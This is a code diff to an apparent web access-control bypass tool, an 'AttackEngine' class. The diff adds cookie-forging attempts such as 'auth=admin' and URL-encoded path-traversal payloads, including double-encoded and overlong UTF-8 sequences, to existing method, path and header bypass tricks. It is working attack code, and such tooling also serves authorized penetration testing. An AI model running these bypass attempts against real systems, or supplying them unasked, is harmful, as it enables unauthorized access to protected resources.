@@ -158,7 +158,7 @@ class AttackEngine:
             bypass_attempts.append({"method": method, "url": url, "desc": f"Method={method}"})
         # 2. Path variations
         paths_to_try = [
-            path, path + '/', f"/{path.strip('/')}", f"/{path.strip('/')}/",
+            path, path + '/', f"/{path.strip('/')}" , f"/{path.strip('/')}/",
             f"{path}/.", f"{path}/..;", f"{path}..;", f"{path}//", f"{path}/%2e/",
             f"{path}.json", f"{path}.xml", f"{path}.config", f"{path}.bak", f"{path}.old",
             path.upper(), path.lower(),
@@ -182,6 +182,24 @@ class AttackEngine:
         for h in headers_to_try:
              method = "POST" if "Content-Length" in h else "GET"
              bypass_attempts.append({"method": method, "url": url, "headers": h, "desc": f"Header={list(h.keys())[0]}"})
+        # 4. Cookie Manipulation
+        cookies_to_try = [
+            {"Cookie": "session=invalid;"},
+            {"Cookie": "auth=admin;"},
+            {"Cookie": "user=guest;"},
+        ]
+        for c in cookies_to_try:
+            bypass_attempts.append({"method": "GET", "url": url, "headers": c, "desc": f"Cookie={list(c.values())[0]}"})
+        # 5. URL Obfuscation
+        obfuscated_paths = [
+            f"{path}/%2e%2e/", f"{path}/%2e%2e%2f", f"{path}/%252e%252e/",
+            f"{path}/%252e%252e%252f", f"{path}/%c0%af", f"{path}/%c0%ae%c0%af",
+        ]
+        for op in obfuscated_paths:
+            obfuscated_url = urljoin(base_url, op)
+            if self._normalize_url(obfuscated_url) != self._normalize_url(url):
+                bypass_attempts.append({"method": "GET", "url": obfuscated_url, "desc": f"ObfuscatedPath={op}"})
+
         # --- Execute Attempts ---
         bypass_found = False
         for attempt in bypass_attempts:
